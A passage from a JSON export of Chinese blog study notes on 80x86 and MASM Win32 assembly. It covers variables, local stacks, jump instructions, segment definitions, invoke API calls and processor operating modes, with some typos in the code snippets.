第二段是在定义的同时指定结构中各字段的初始化值，各字段的初始值用逗号隔开 数据结构的引用在汇编中数据结构的引用方法有好几种，以上面的定义为例，如果要使用stWndClass中的lpfnWndProc字段，最直接的办法是： 1mov eax,stWndClass.lpfnWndProc 在实际使用中，常常有使用指令存取数据结构的情况，如果使用esi寄存器做指针寻址，可以使用下列语句： 12mov esi,offset stWndClassmove ax,[esi+WNDCLASS.lpfnWndProc] 注意第二句是move ax,[esi+WNDCLASS.lpfnWndProc]而不是move ax,[esi+stWndClass.lpfnWndProc]，因为前者被编译成mov eax,[esi+4]，而后者被编译成mov eax,[esi+403004h]，后者的结果显然是错误的 MASM中还有一个用法，可以用assume伪指令把寄存器预先定义为结构指针，再进行操作： 12345mov esi,offset stWndClassassume esi:ptr WNDCLASSmovea ax,[esi].lpfnWndProc...assume esi:nothing 注意：在不再使用esi寄存器做指针的时候要用assume esi:nothing取消定义 结构定义的嵌套结构的定义也可以嵌套，如下： 1234NEW_WNDCLASS struct DwOption dword ? OldWndClass WNDCLASS &lt;&gt;NEW_WNDCLASS ends","categories":[],"tags":[]},{"title":"80x86汇编笔记03","slug":"80x86╗π▒α▒╩╝╟03","date":"2020-02-28T03:32:11.000Z","updated":"2020-02-28T19:32:36.000Z","comments":true,"path":"2020/02/27/80x86╗π▒α▒╩╝╟03/","link":"","permalink":"http://yoursite.com/2020/02/27/80x86╗π▒α▒╩╝╟03/","excerpt":"","text":"标号、变量和数据结构当程序中要跳转到另一位置时，需要有一个标识来指示位置，这就是标号，通过在目的地址的前面放一个标号，可以在指令中使用标号来代替直接使用地址 变量的值在程序运行中是经常改变的，所以它必须定义在可写的段内，如data和data?，或者在堆栈内。按照定义的位置不同，MASM中的变量也分为全局变量和局部变量 在MASM中标号和变量的命名规范是相同的： 可以用字母、数字、下划线以及符号@、$和？ 第一个符号不能是数字 长度不能超过240个字符 不能使用指令名等关键字 在作用域内必须是唯一的 标号的定义格式一： 1标号名： 目的指令 格式二： 1标号名:: 目的指令 标号的作用域是当前的子程序，在不同子程序中可以存在同样名字的标号，这也就意味着这种格式不能从一个子程序通过标号跳转到另一个子程序中。如果是在需要从一个子程序中用指令跳转到另一个子程序中的标号位置时候，我们用格式二 @@因为标号有限，我们一般用下面的方式来取标号，节省标号开支 123456mov cx,1234hcmp flag,1je @F ；F这里是Forward的意思mov cx,1000h@@: lopp @B ;B这里是Before的意思 当用@@做标号时，@F表示本条指令后的第一个@@标号，@B表示本条指令前的第一个@@标号 当程序中可以有多个@@标号，@B和@F只寻找匹配最近的一个 不要在间隔太远的代码中使用@@符号，距离最好限制在编辑器能够显示的同一屏幕的范围内 变量全局变量全局变量的作用域是整个程序，Win32汇编的全局变量定义在data或data？段内，可以同时定义变量的类型和长度，格式如： 12变量名 类型 初始值1，初始值2，……变量名 类型 初重复数量 dup(始值1，初始值2，……) 名称 表示方式 缩写 长度（字节） 字节 byte db 1 字 word dw 2 双字(double word) dword dd 4 三字(far word) fword df 6 四字(quad word) qword dq 8 十字节BCD码(ten byte) tbyte dt 10 有符号字节(sign byte) sbyte 1 有符号子(sign byte) sword 2 有符号双字(sign dword) sdword 4 单精度浮点数 real4 4 双精度浮点数 real8 8 10字节浮点数 real10 10 所有使用到变量类型的情况中，只有定义全局变量的时候才可以用缩写 在byte类型变量的定义中，可以用引号定义字符串和数值定义的方法混用 假设要定义两个字符串Hello,World!和Hello again，每个字符串后面中回车和换行符，最后以一个0字符结尾，可以定义如下： 12szText db &quot;Hello World!&quot;,0dh,0ah,\\&quot;Hello again&quot;,0dh,0ah,0 DOS和Windows采用回车+换行(CR/LF)表示下一行，而UNIX/Linux采用换行符(LF)表示下一行，macOS则采用回车符(CR)表示下一行 CR用符号”\\r”表示，十进制ASCII代码是13，十六进制代码为0x0D LF使用”\\n“符号表示，ASCII代码是10，十六进制为0x0A 全局变量在定义中既可以指定初值，也可以预留，在data？段中，只能用问号预留空间，在data？段中不能指定初始值 局部变量局部变量这个概念出现以后，两个以上子程序都要用到的数据才被定义为全局变量统一放在数据段中，仅在子程序内部使用的变量则放在堆栈中，这样还可以使得子程序编程黑匣子的模样，使程序的模块结构更加分明 局部变量的作用域是单个子程序，在进入子程序的时候，通过修改堆栈指针esp来预留出需要的空间，再用ret指令返回主程序之前，同样通过恢复esp丢弃这些空间 局部变量因为空间是临时分配的，所以无法定义含有初始化值的变量，对局部变量的初始化一般在子程序中由指令完成 局部变量的定义MASM用local伪指令提供了对局部变量的支持，格式是： 1local 变量名1[[重复数量]][:类型]，变量名2[[重复数量]][:类型]…… local伪指令必须紧接在子程序定义的伪指令proc后，其它指令开始前，这是因为局部变量的数目必须在子程序开始的时候就确定下来系统才知道如何分配，在一个local语句定义不下的时候，可以有多个local语句，语法中的数据类型不能用缩写 Win32汇编默认的类型是dword，如果定义dword类型的局部变量，则类型可以省略 当定义数组的时候，可以[]括号起来。不能使用定义全局变量的dup伪指令 局部变量不能和已定义的全局变量同名 局部变量的作用域是当前子程序，所以在不同的子程序中可以有同名的局部变量 一些例子： 123local loc1[1024]:byte ;定义了一个1024字节长的局部变量loc1local loc2 ;定义了一个名为loc2的局部变量，类型是默认值dwordlocal loc3：WNDCLASS ;定义了一个WNDCLASS数据结构，名为loc3 局部变量的使用12345678TestProc proc ;名为TestProc的子程序local @loc1:dword,@loc2:wordlocal @loc3:byte ;用local语句定义了3个变量mov eax,@loc1 ;对应类型进行转储，然后返回mov ax,@loc2mov al,@loc3retTestProc endp 其实在编译后的文件再反汇编的话，可以发现编译器编译后的指令比源程序多了前后两段指令： 12345push ebpmov ebp,espadd esp,FFFFFFF8……leave 这就是使用局部变量所必须的指令，分别用于局部变量的准备工作和扫尾工作 分析过程： 当调用者执行了call TestProc指令后，CPU把返回的地址（当前地址）压入堆栈，再转移（jmp）到子程序执行 esp在程序的执行过程中可能随时用到，不可能用esp来随时存取局部变量，ebp寄存器是以堆栈段为默认数据段的，所以，可以用ebp做指针指向堆栈代替esp 于是，在初始化前，先用一句push ebp指令把原来的ebp保存起来，然后把esp的值传递给ebp 因为在80386处理器中，以dword(32位)为界对齐时读取内存速度最快，所以MASM宁可浪费一些内存单元进行对齐 在程序退出前，必须把正确的esp设置回去，否则，ret指令会从堆栈中取出错误的地址返回，因为有mov ebp,esp，所以要返回的时候只要先mov esp,ebp，然后再pop ebp，堆栈就是正确的了 在80386指令集中有一条指令可以在一句中实现这些功能，就是leave指令，所以，编译器在ret指令之前只使用了一句leave指令 和全局变量不一样，局部变量的初始值是随机的，是其他子程序执行后在堆栈里留下的垃圾（因为我们知道，腾出空间只是改变栈指针esp），所以，对局部变量的值一定要初始化，特别是定义为结构后当参数传递给API函数的时候 变量的使用在MASM中以不同的类型访问不会对变量造成影响。在MASM中，如果要用指定类型之外的长度访问变量，必须显式地指出要访问地长度，这样编译器忽略语法上的长度检验，仅使用变量地地址 1类型 ptr 变量名 类型可以是byte，word，dword，fword，qword，real8和real10，如： 1mov ax,word ptr szBuffer 指定类型地参数访问并不会去检测长度是否溢出 例子： 123456789.databTest1 db 12hwTest2 dw 1234hdwTest3 dd 12345678h…….codemov al,bTest1mov ax,word ptr bTest1mov eax,dowrd ptr bTest1 mov al,bTest1这一句显然使al等于12h，下面的两句，ax和eax难道等于0012h和00000012h吗？实际运行的结果使3412h和78123412h 下面是反汇编后的结果： 1234567;.data段中的变量;.data段中变量是按顺序从低地址往高地址排列的，对于超过一个字节的数据，80386处理器的数据排列方式是小端序00403000 12 34 12 78 56 34 12;.code段中的代码00401000 A000304000 mov al,byte ptr [00403000]00401005 66A10030400 mov ax,word ptr [00403000]0040100B A100304000 mov eax,dword ptr [00403000] 在执行指令mov ax,word ptr bTest1的时候，是从bTest1的地址403000h处取一个字，其长度已经超过了bTest1的范围并落到了wTest2中。从内存中看，是取了bTest1的数据12h和wTest2的低位数据34h，在这两个字节中，12h位于低地址，所以ax中的数值是3412h 同理，看mov eax,dword ptr bTest1这条指令取了bTest1，wTest2的全部和dwTest3的最低位78h，在内存中的排列是12h 34h 12h 78h，所以eax等于78123412h 这个例子说明了汇编用ptr强制覆盖变量长度的时候，实质上是只用了变量的地址而禁止编译器进行检验。编译器并不会考虑定界的问题，程序员在使用的时候必须对内存中的数据排列有个全局概念，以免越界存取到意料之外的数据 如果只是想把bTest1的一个字节拓展到一个字或一个双字再放到ax或eax中，高位保持0而不是越界存取到其他的变量，80386处理器提供的movzx指令可以实现这个功能，例如： 1234movzx ax,bTest1 ;ax == 0012hmovzx eax,bTest1 ;eax == 00000012hmovzx eax,cl ;eax == 000000(cl)movzx eax,ax ;eax == 0000(ax) 用movzx指令进行数据长度扩展是Win32汇编中常用技巧 movsx是有符号的数据扩展 变量的尺寸和数量在源程序中用到变量的尺寸和数量的时候，可以用sizeof和lengthof伪指令来实现，格式是： 12sizeof 变量名、数据类型或数据结构名lengthof 变量名 它们的区别是： sizeof伪指令可以取得变量、数据类型或数据结构以字节为单位的长度 lengthof则可以取得变量中数据的项数 例如： 1234567891011stWndClass WNDCALSS &lt;&gt;szHello db &apos;Hello,world&apos;,0dwTest dd 1,2,3,4....code...mov eax,sizeof stWndClassmov ebx,sizeof WNDCLASSmov ecx,sizeof szHellomov edx,sizeof dowordmov esi,sizeof dwTest 执行后eax的值是stWndClass结构的长度：40 ebx同样是：40 ecx的值是szHello的长度：13 edx的值是一个双字的长度：4 如果把所有的sizeof换成lengthof： 那么eax会等于1，因为只定义了1项WNDCLASS ecx同样等于13 esi则等于4 lengthof WNDCLASST和lengthof dword是非法的用法，编译器报错 如果分两行定义： 12szHello db &apos;hello&apos;,0dh,0ah db &apos;world&apos;,0 sizeof szHello的值是7而不是13.因为MASM中的变量定义只认一行，后一行实际上是另一个没有名称的数据定义 获取变量地址获取变量地址的操作对于全局变量和局部变量是不同的 全局变量对于全局变量，它的地址在编译的时候已经由编译器确定了： 1mov 寄存器，offset 变量名 其中offset是取变量地址的伪操作符 局部变量对于局部变量，它是用ebp来做指针操作的，假设ebp的值是40100h，那么第一个局部变量的地址是ebp-4即400FCh 由于ebp的值随着程序的执行环境不同可能是不同的，所以局部变量的地址值在编译的时候也是不确定的，不能用offset伪操作符来获取它的地址 取指针的地址80386处理器中有一条指令用来获取指针的地址，就是lea指令，如： 1lea eax,[ebp-4] 该指令可以在运行时按照ebp的值实际计算出地址放到eax中 如果要在invoke伪指令的参数中用到一个局部变量的地址，MASM对此有一个专用的伪操作符addr，其格式为： 1addr 局部变量名 或 全局变量名 当addr后跟全局变量名的时候，用法和offset是相同的 当addr后面跟局部变量名的时候，编译器自动用lea指令先把地址取到eax中，然后用eax来代替变量地址 addr伪操作符只能在invoke的参数中使用，不能用在类似的场合： move ax,addr 局部变量名 假设在一个子程序中有如下invoke指令： 1invoke Test,eax,addr szHello 编译器会把invoke伪指令和addr翻译成下面这样： 1234lea eax,[ebp-4]push eax ;参数2：addr szHellopush eax ;参数1：eaxcall Test 编译器会报错，也就是说，要用到的eax的值不再有效，所以挡在invoke中使用addr伪操作符时，注意在它的前面不能用eax，否则eax的值会被覆盖掉，当然eax在addr的后面的参数中用是可以的","categories":[],"tags":[]},{"title":"汇编跳转指令汇总","slug":"╗π▒α╠°╫¬╓╕┴ε╗π╫▄","date":"2020-02-27T08:53:10.000Z","updated":"2020-02-28T00:53:40.000Z","comments":true,"path":"2020/02/27/╗π▒α╠°╫¬╓╕┴ε╗π╫▄/","link":"","permalink":"http://yoursite.com/2020/02/27/╗π▒α╠°╫¬╓╕┴ε╗π╫▄/","excerpt":"","text":"无条件跳转 名称 条件 JMP 无条件跳转 根据CX、ECX寄存器的值跳转 名称 条件 JCXZ CX为0则跳转 JECXZ ECX为0则跳转 根据标志位跳转的指令无符号数 名称 条件 JA 无符号大于则跳转 JNA 无符号不大于则跳转 JAE 无符号大于等于则跳转，同JNB JNAE 无符号不大于等于则跳转，同JB JB 无符号小于则跳转 JNB 无符号不小于则跳转 JBE 无符号小于等于则跳转，同JNA JNBE 无符号不小于等于则跳转，同JA 有符号数 名称 条件 JG 有符号大于则跳转 JNG 有符号不大于则跳转 JGE 有符号大于等于则跳转，同JNL JNGE 有符号不大于等于则跳转，同JL JL 有符号小于则跳转 JNL 有符号不小于则跳转 JLE 有符号小于等于则跳转，同JNG JNLE 有符号不小于等于则跳转，同JG 其它 名称 条件 JE 等于则跳转，同JZ JNE 不等于则跳转，同JNZ JZ 为零则跳转 JNZ 不为零则跳转 JS 为负则跳转 JNS 不为负则跳转 JC 进位则跳转 JNC 不进位则跳转 JO 溢出则跳转 JNO 不溢出则跳转 JP 为偶则跳转 JNP 不为偶则跳转 JPE 奇偶位置位则跳转，同JP JPO 奇偶位复位则跳转，同JNP","categories":[],"tags":[]},{"title":"80x86汇编笔记02","slug":"80x86╗π▒α▒╩╝╟02","date":"2020-02-27T08:41:04.000Z","updated":"2020-02-28T00:41:20.000Z","comments":true,"path":"2020/02/27/80x86╗π▒α▒╩╝╟02/","link":"","permalink":"http://yoursite.com/2020/02/27/80x86╗π▒α▒╩╝╟02/","excerpt":"","text":"模式定义指定使用的指令集.386语句是汇编语句的伪指令，类似的指令还有：.8086、.186、.286、.386/386p、.486/486p和.586/586p等，用于告诉编译器在本程序中使用的指令集 在DOS的汇编中默认使用的是8086指令集，Win32环境工作在80386及以上的处理器中，所以需要指定指令集 另外，后面带p的伪指令则表示程序中可以在使用特权指令，这一类特权指令必须在特权级0上运行 model语句.model语句在低版本的宏汇编中已经存在，用来定义程序工作的模式，它的使用方法是 1.model 内存模式 [语言模式][其他模式] 内存模式 模式 内存使用方式 tiny 用来建立.com文件，所有的代码、数据和堆栈都在同一个64KB段内 small 建立代码和数据分别用一个64KB段的.exe文件 medium 代码段可以有多个64KB段，数据段只有个64KB段 compact 代码段只有一个64KB，数据段可以有多个64KB段 large 代码段和数据段都可以有多个64KB段 huge 同large，并且数据段中的一个数组也可以超过64KB flat WIn32程序使用的模式，代码和数据段使用同一个4GB段 对于Win32程序来说，只有一种内存模式，即flat(平坦模式)，意思是内存是很平坦的从0延伸到4GB，再没有64KB段大小限制。因为4GB空间用32位的寄存器全部都能访问到，不必在头脑中随时记着当前使用的是哪个数据段。 如果定义了.model flat，MASM自动为各种段寄存器做了如下定义： 1ASSUME cs:FLAT,ds:FLAT,ss:FLAT,es:FLAT,fs:ERROR,gs:ERROR 也就是说，CS、DS、SS和ES段全部使用平坦模式。FS和GS寄存器默认不使用，但如果要使用需要声明： 12assume fs:nothing,gs:nothing ；或者assume fs:FLAT,gs:FLAT 语言模式在Win32汇编中，model语句还指定语言模式，即子程序和调用方式。一般使用的是stdcall，它指出了调用子程序或Win32 API时参数传递的次序和堆栈平衡的方法 还有C，SysCall，BASIC，FORTAN和PASCALL 因为Windows的API调用使用的是stdcall格式，所以在Win32汇编中没有选择，必须在.model中加上stdcall参数 _stdcall调用一般是Pascal程序的缺省调用方式。参数采用从右到左的压栈方式，被调函数自身在返回前清空堆栈 _cdecl调用一般是C/C++程序的缺省调用方式。参数采用从右到左的压栈方式，传送参数的内存栈由调用者维护。cdecl约定的函数只能被C/C++调用，每一个调用它的函数都包含清空堆栈的代码，所以产生的可执行文件大小会比调用stdcall函数的大 option语句如option casemap:none的意义是告诉编译器程序中的变量名和子程序名是否对大小写敏感。由于Win32 API的API函数名称本质是区分大小写的，所以必须指定这个选项，否则调用API函数就会出现问题 段的定义12345678910111213141516.386.model flat,stdcalloption casemap:none&lt;一些include语句&gt;.stack [堆栈段的大小].data&lt;一些初始化过的变量定义&gt;.data?&lt;一些没有初始化过的变量定义&gt;.const&lt;一些常量定义&gt;.code &lt;代码&gt; &lt;开始标号&gt; &lt;其他语句&gt;end 开始标号 stack、data、data？、const和code都是分段伪指令，Win32中实际上只有代码和数据之分 data、data？和const这些都是指向数据段，code是指向代码段 和DOS汇编不同，Win32汇编不必考虑堆栈，系统会为程序分配一个向下的拓展的、足够大的段作为堆栈段，所以stack段定义常常被忽略 Win32和DOS的不同所以Win32中段，实际上并不是DOS汇编中那种意义的段，而是内存的“分段”。上一个段的结束就是下一个段的开始，所有的分段，合起来，包括系统使用的地址空间，就组成了整个可以寻址的4GB空间 Win32汇编的内存管理使用了80386处理器的分页机制，每个页(4KB大小)可以自由指定属性，所以上一个4KB可能是代码，属性是可执行但不可写，下一个4KB就有可能是既可读也可写但不可执行的数据 Win32汇编程序中“分段”的概念实际上是把不同类型的数据或代码归类，再放到不同属性的内存页（也就是不同的“分段”）中，这中间不涉及使用不同的段选择器 数据段data、data？和const定义的是数据段，分别对应不同方式的数据定义，在最后生成的可执行文件中也分别放在不同的节区(Section)中 程序中的数据定义一段可以归纳为3类： 可读可写的已定义变量 这些数据在源程序中已经被定义了初始值，而且在程序的执行中有可能被更改 .data段是已初始化数据段，其中定义的数据是可读可写的，在程序装入完成的时候，这些值就已经在内存中，data段存放在可执行文件的_DATA节区内 可读可写的未定义变量 这些变量一般是当做缓冲区或者在程序执行后才开始使用的，这些数据可以定义在.data段中，也可以定义在.data?段中，但一般把它放到.data?段中 虽然定义在这两种段中都可以正常使用，但定义在.data?段中不会增大.exe文件的大小 举例说明，如果要用到一个100KB的缓冲区，可以在数据段中定义 szBuffer db 100*1024 dup(?) 如果放在.data段中，编译器认为这些数据在程序装入时必须有效，所以它在生成可执行文件的时候保留了所有的100KB内容 如果放在.data?段中，其中的内容编译器会认为程序在开始执行后才会用到，所以它在生成可执行文件的时候只保留了大小信息，不会浪费磁盘空间 常量 这些数据放在.const段中，它是可读不可写的 一般为了方便起见，在小程序中常常把常量一起定义到data段中，而不另外定义一个const段 如果想要写入const段中的数据，会引起保护错误 代码段code段是代码段，所有的指令都必须写在代码段中，在可执行文件中，代码段是放在_TEXT节区中的。Win32环境中的数据段是不可执行的，只有代码段有可执行的属性。对于工作在特权级3的应用程序来说，code段是不可写的 在Windows95下，在特权级0下运行的程序对所有的段都有读写的权利，包括代码段。另外，在优先级3下与运行的程序也不是一定不能写代码段，代码段的属性是由可执行文件PE头部中的属性位决定的。通过编辑磁盘上的exe文件，把代码段属性位改成可写，那么在程序中就允许修改自己的代码段 一些典型的应用就是一些针对可执行文件的压缩软件和加壳软件，如UPX和PeCompact等 这些软件靠把代码段进行变换来达到解压缩和解密的目的，被处理过的可执行文件在执行时需要由解压代码来将代码段解压缩，这就需要写代码段，所以这些软件对可执行文件代码段的属性预先做修改 程序结束和程序入口在汇编程序中，并没有一个main函数，程序员可以指定从代码段的任何一个地方开始执行，这个地方由程序最后一句的end语句来指定 1end [开始地址] 这句语句同时表示源程序结束，所有的代码必须在end语句之前。但是，一个源程序不必非要指定入口标号，这时候可以把开始地址忽略不写，这种情况发生在编写多模块程序的单个模块的时候 当分开写多个程序模块时，每个模块的源程序中也可以包括data、data？、const和code段，只是其他模块最后的end语句必须不带开始地址 当最后多个模块链接在一起的时候，只能由一个主模块指定入口地址，在多个模块中指定入口地址或者没有一个模块指定了入口地址，链接程序都会报错 换行当源程序的某一行过长，不利于阅读的时候，可以分行书写，分行的办法是在一行的最后用反斜杠(\\)做换行符 调用API函数 Win32程序是构筑在Win32 API基础上的。在Win32 API中，包括了大量的函数、结构和消息等，它不仅为应用程序所调用，也是Windows自身的一部分，Windows自身的运行也调用这些API函数 程序调用系统功能的一般过程：首先，系统提供功能模块并约定参数的定义方法，同时约定调用的方式，同时约定调用的方式，应用程序按照这个约定来调用系统功能 在DOS常用系统中断来实现调用。与DOS中断相比，Win32的系统功能模块放在Windows的动态链接库(DLL中) DLL是一种Windows的可执行文件，采用的是和我们熟悉的exe文件同样的PE约定格式，装着各种系统的API函数。实际上，Win32的基础就是由DLL组成的。Win32 API的核心由3个DLL提供，它们是： KERNEL32.DLL：系统服务功能，包括内存管理、任务管理和动态链接等 GDI32.DLL：图形设备接口，处理图形绘制 USER32.DLL：用户接口服务，建立窗口和传送消息 还有其他的不同DLL，例如使用TCP/IP协议进行网络通信的DLL是Wsock32.dll，它所提供的API称为Socker API；专用于电话服务方面的API称为TAPI（Telephony API），包含在Tapi32.dll中 API函数的参数DOS下通过中断来调用系统“函数”，其中的“参数”是通过放在寄存器中 Win32 API是用堆栈来传递参数的，调用者把参数一个个压入堆栈，DLL中的函数程序再从堆栈中取出参数处理，并在返回之前将堆栈中已经无用的参数丢弃。在《Microsoft Win32 Programmer’s Reference》中定义了常用API的参数和函数声明 Win32环境中的参数实际上只有一种类型，那就是一个32位的整数，实际上就是汇编中的dword（double word、dd、双字型、4个字节、两个字、32位） Windows所有编程资料发布的格式也是C格式 例子，在汇编中调用MessageBox函数的方法是： 12345push uTypepush lpCaptionpush lpTextpush hWndcall MessageBox 在源程序编译链接成可执行文件后，call MessageBox语句中的MessageBox会被换成一个地址，指向可执行文件中的导入表的一个索引（函数名或索引号） 导入表中指向MessageBox函数的实际地址会在程序装入内存的时候，根据User32.dll在内存中的位置由系统动态填入 使用invoke语句API是可以调用了，另一个麻烦的问题是Win32的API动辄就是十几个参数，整个源程序一眼看上去基本上都是把参数压堆栈的push指令，参数的个数和顺序很容易搞错，源程序可读性差 微软在MASM中提供了一个伪指令实现了一句中打入所有的参数，并在参数使用错误的时候能够提示，那就是invoke伪指令 1invoke 函数名 [参数1][参数2]...[参数n] 例如调用MessageBox函数： 1invoke MessageBox,NULL,offsetszText,offset szCaption,MB_OK invoke并不是80386处理器的指令，而是一个MASM编译器的伪指令，在编译的时候它把上面的指令展开成我们需要的4个push指令和一个call指令，同时进行参数数量的检查工作 对于不带参数的API调用，invoke伪指令的参数检查功能可有可无，既可以用call也可以用invoke API函数的返回值返回值的类型对于汇编程序来说也只有dword一种类型，它永远放在eax中 如果要返回的内容不是一个eax所能容纳的，Win32 API采用的方式一般是返回一个指针，或者在调用参数中提供一个缓冲区地址，干脆把数据直接返回到缓冲区中去 函数的声明在调用API函数的时候，函数原型也必须预先声明，声明函数的格式是： 1函数名 proto [距离][语言][参数1]:数据类型,[参数2]:数据类型 proto是函数声明的伪指令，距离可以是NEAR、FAR、NEAR16、NEAR32、FAR16或FAR32，Win32中只有一个平坦的段，无所谓距离，所以在定义的时候忽略的 对于Win32汇编来说只存在dword类型的参数，所以所有的参数类型永远都是dword，另外对于参数的名称其实是无用的，仅为了可读性，所以下面两句消息框函数的定义是一致的： 1MessageBox Proto hWnd:dword,lpText:dword,lpCation:dword,uType:dword 1MessageBox Proto :dword,:dword,:dword,:doword 在Win32环境中，和字符串相关的API共有两类，分别对应两个字符集：一类是处理ANSI字符集(1B)的，另一类是处理Unicode字符集(2B)的。前一类函数名字的尾部带一个A字符，另一种则带一个W字符 include语句在MASM32工具包中已经包括了所有DLL的API函数声明列表，每个DLL对应.inc文件，在源程序中只要使用include包含进来就可以了，例如： 12include user32.incinclude kernel32,inc includelib语句一个DLL文件对应一个导入库，如User32.dll文件用于编程的导入库是User32.lib，MASM32工具包中包含了所有DLL的导入库 和inlcude语句的处理不同，includelib不会吧.lib文件插入到源程序中，它只是告诉连接器在链接的时候到指定的库文件中去找而已。DLL文件中的函数没有包括声明，所以才需要将.inc文件插进去","categories":[],"tags":[]},{"title":"80x86汇编笔记01","slug":"80x86╗π▒α▒╩╝╟01","date":"2020-02-26T00:58:14.000Z","updated":"2020-02-26T16:58:38.000Z","comments":true,"path":"2020/02/25/80x86╗π▒α▒╩╝╟01/","link":"","permalink":"http://yoursite.com/2020/02/25/80x86╗π▒α▒╩╝╟01/","excerpt":"","text":"80x86处理器的工作模式80386以后的处理器有3种工作模式：实模式、保护模式和虚拟8086模式 其实，实模式和虚拟8086模式是为了向下兼容而设置的。而保护模式现代操作系统实际上的工作模式。只有在保护模式下，32位CPU的寻址才能达到4GB的地址空间，同时，也能实现多任务、内存分页管理和优先级保护等先进的机制 实模式处理器被复位或者加电的时候以实模式启动，这时候处理器中各寄存器以实模式的初始化值工作。80386处理器在实模式下的寄存器寻址方式和8086是一样的，由段寄存器的内容乘以16当做基地址，加上段内的偏移地址形成最终的物理地址，这时候它的32位地址只使用了低20位 在实模式下，80386处理器不能对内存进行分页管理，所以指令寻址的地址就是内存中实际的物理地址。在实模式下，所有的段都是可以读、写和执行的 实模式下80386不支持优先级，所有的指令相当于工作在特权级(优先级0)，所以它可以执行所有特权指令，包括读写控制寄存器CR0等 实际上，80386就是通过在实模式下初始化控制寄存器，GDTR、LDTR、IDTR与TR等管理寄存器以及页表，然后通过加载CR0使其中的保护模式使能位置位而进入保护模式的。当然，实模式下不支持硬件上的多任务切换 实模式下的中断处理方式和8086处理器相同，也用中断向量表来定位中断服务程序地址 中断向量表的结构也和8086处理器一样。每4个字节组成一个中断向量，其中包括两个字节的段地址和两个字节的偏移地址 80386实模式的最大的好处是可以使用80386的32位寄存器，还增加了两个辅助段寄存器FS和GS，使程序更加简洁，加快了执行速度。 保护模式当80386工作在保护模式的时候，所有功能均可用。所有的32根地址线都可提供寻址，物理寻址空间高达4GB 在保护模式下，支持内存分页机制，提供了对虚拟内存的良好支持。虽然与8086可寻址的1MB物理地址空间相比，80386可寻址的物理地址空间非常大，但实际的微机系统不可能安装如此大的物理内存。所以，为了运行大型程序和真正实现多任务，虚拟内存是一种必需的技术 保护模式下80386支持多任务，可以依靠硬件仅在一条指令中实现任务切换。任务环境的保护工作是由处理器自动完成的 在保护模式下，80386处理器还支持优先级机制，不同的程序可以运行在不同的优先级上 优先级一共分0~3共4个级别，操作系统运行在最高的优先级0上，应用程序则运行在比较低的级别上 配合良好的检查及之后，既可以在任务间实现数据的安全共享也可以很好地隔离各个任务。从实模式切换到保护模式是通过修改控制寄存器CR0的控制位PE(位0)来实现的。在这之前还需要建立保护模式必需的一些数据表，如全局描述符表GDT和中断描述符表IDT等 DOS操作系统运行于实模式下，而WIndows操作系统运行于保护模式下 虚拟8086模式虚拟8086模式是以任务形式在保护模式上执行的，在80386上可以同时支持由多个真正的80386任务和虚拟8086模式构成的任务 在虚拟8086模式下，80386支持任务切换和内存分页。在Windows操作系统中，有一部分程序专门用来管理虚拟8086模式的任务，称为虚拟8086管理程序 为了和8086程序的寻址方式兼容，虚拟8086模式采用和9096一样的寻址方式，即用段寄存器乘以16当做基址再配合偏移地址形成线性地址，寻址空间为1MB 但显然多个虚拟8086任务不能同时使用同一位置的1MB地址空间，否则会引起冲突。操作系统利用分页机制将不同虚拟8086任务的地址空间映射到不同的物理地址上去，这样每个8086任务看起来都认为自己在使用0~1MB的地址空间 8086代码中有相当一部分指令在保护模式下属于特权指令，如屏蔽中断的cli和中断返回指令iret等。这些指令在8086程序中是合法的。如果不让这些指令执行，8086代码就无法工作。虚拟8086管理程序采用模拟的方法来完成这些指令 虚拟8086管理程序在异常处理程序中检查产生异常的指令，如果是中断指令，则从虚拟8086任务的中断向量表中取出中断处理程序的入口地址，并将控制转移过去。如果是危及操作系统的指令，如cli等，则简单地忽略这些指令，在异常处理程序返回的时候直接返回到下一条指令 通过这些措施，8086程序既可以正常地运行下去，在执行这些指令的时候又察觉不到已经被虚拟8086管理程序做了手脚。 DOS操作系统的内存安排 8086处理器的寻址范围只有1MB，系统硬件使用的存储器地址安排在高地址内存 地址是从A0000h（即640KB）开始的384KB中，其中有用于显示的视频缓冲区和BIOS的地址空间 而在低地址内存，安排了中断向量表和BIOS数据区；剩下从500h开始到A0000h总共不到640KB的内存是操作系统和应用程序所能够使用的；应用程序不可能使用这640KB以外的内存。而即使在这640KB中，DOS操作系统又占领了低端的一部分内存，最后剩下600KB左右的内存才是应用程序真正可以用的 如果系统中有内存驻留程序存在，那么应用程序还要和这些TSR(Terminate and Stay Resident 内存驻留程序)程序共同分享这段内存空间 80386的内存寻址机制实模式实模式下，一个完成的地址由段地址和偏移地址两部分组成。处理器换算时先将段地址乘以10h，得到段在物理内存中的起始地址，然后加上16位的偏移地址得到实际的物理地址 保护模式和虚拟8086模式当80386处理器工作在保护模式和虚拟8086模式的时候，可以使用全部32根地址线访问4GB大的内存。段地址加偏移地址的计算方法显然无法覆盖这么大的范围 但计算机一下就可以发现，实际上和8086同样的限制已经不复存在，因为80386所有的通用寄存器都是32位的，2的32次方就是4G，所以用任何一个通用寄存器来间接寻址，不必分段就已经可以访问到所有的内存地址 虽然在寻址上不再有分段的限制问题，但在保护模式下，一个地址空间是否可以被写入，可以被多少优先级的代码写入，就涉及保护的问题了。解决这些问题，必须对一个地址空间定义一些安全上的属性，可否就将这些属性存放在段寄存器中？ 问题来了，涉及属性和保护模式下段的其他参数，要表示的信息太多了，要用64位长的数据才能表示。我们把这64位的属性数据叫做段描述符(Segment Descriptor) 80386的段寄存器依然是16位的，无法放下保护模式下64位的段描述符。需要把所有段的描述符按顺序放在内存中的指定位置，组成一个段描述符表(Descriptor Table) 而段寄存器中的16位用来做索引信息，指定这个段的属性用段描述符表中的第几个描述符来表示 这时段寄存器中的信息不再是段地址了，而是段选择器(Segment Selector)。可以通过它在段描述符表中选择一个项目以得到段的全部信息 80386中引入了两个全新的寄存器来管理段描述符表。一个是48位的全局描述符表寄存器GDTR，一个是16位的局部描述符表寄存器LDTR 实际上16位的段选择器中只有高13位表示索引值。剩下的3个数据位中，第0、1位表示程序的当前优先级RPL；第2位TI位用来表示在段描述符的位置；TI=0表示在GDT中，TI=1表示在LDT中 在保护模式下，同样以xxxx:yyyyyyyy格式表示一个虚拟地址 注意，xxxx(16位，相当于8086时代的段地址)保存在段寄存器，yyyyyyyy（32位，相当于8086时代的偏移地址）保存在通用寄存器 GDTRGDTR指向的描述符表为全局描述符表GDT(Global Descriptor Table)，它包含系统中所有任务都可用的段描述符，它包含系统中所有任务都可用的段描述符，通常包含描述符操作系统所使用的代码段、数据段和堆栈段的描述符及各任务的LDT段等；全局描述符表只有一个 LDTRLDTR则指向局部描述符表LDT(Local Descriptor 